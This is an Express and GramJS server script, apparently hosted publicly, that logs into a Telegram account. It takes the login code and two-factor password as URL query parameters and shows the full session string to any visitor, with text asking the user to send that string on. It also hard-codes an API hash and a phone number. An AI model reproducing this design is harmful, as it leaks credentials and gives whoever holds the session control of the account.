const express = require('express');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
const apiId = 32514591;
const apiHash = '82e267e4d7ca66a1e1fce35896729eb8';
const phoneNumber = '+9647773847800'; // رقمك

const stringSession = new StringSession('');
const client = new TelegramClient(stringSession, apiId, apiHash, {
    connectionRetries: 5,
});

let resolvePhoneCode;
let resolvePassword;

(async () => {
    console.log('جاري طلب الكود من التلكرام...');
    try {
        await client.start({
            phoneNumber: async () => phoneNumber,
            password: async () => {
                return new Promise(resolve => resolvePassword = resolve);
            },
            phoneCode: async () => {
                return new Promise(resolve => resolvePhoneCode = resolve);
            },
            onError: (err) => console.log(err),
        });
        console.log('تم تسجيل الدخول بنجاح!');
    } catch (error) {
        console.log(error);
    }
})();

app.get('/', (req, res) => {
    const sessionString = client.session.save();
    if (sessionString) {
        res.send(`<html dir="rtl"><body style="font-family: Arial; padding: 20px;"><h1>تم الربط بنجاح! 🎉</h1><p>انسخ هذا النص الطويل (السشن) بالكامل ودزه الي:</p><textarea style="width:100%; height:200px; padding:10px;">${sessionString}</textarea></body></html>`);
    } else {
        res.send(`<html dir="rtl"><body style="font-family: Arial; padding: 20px;"><h1>بانتظار الكود...</h1><p>التلكرام دز كود لرقمك. اكتب الكود فوك بالرابط بهذا الشكل:</p><p style="direction: ltr; font-size: 20px; background: #eee; padding: 10px; text-align: left;"><b>https://questions-irfj.onrender.com/login?code=12345</b></p></body></html>`);
    }
});

app.get('/login', (req, res) => {
    const code = req.query.code;
    const pass = req.query.pass;
    
    if (pass && resolvePassword) {
        resolvePassword(pass);
        return res.send('<html dir="rtl"><body><h1>تم إرسال الباسورد!</h1><p>ارجع للرابط الرئيسي بعد 5 ثواني وسوي تحديث.</p></body></html>');
    }
    
    if (code && resolvePhoneCode) {
        resolvePhoneCode(code);
        return res.send('<html dir="rtl"><body><h1>تم إرسال الكود!</h1><p>الآن اكتب رابط الباسورد في الأعلى.</p></body></html>');
    }
    
    res.send('الرجاء كتابة الكود في الرابط.');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
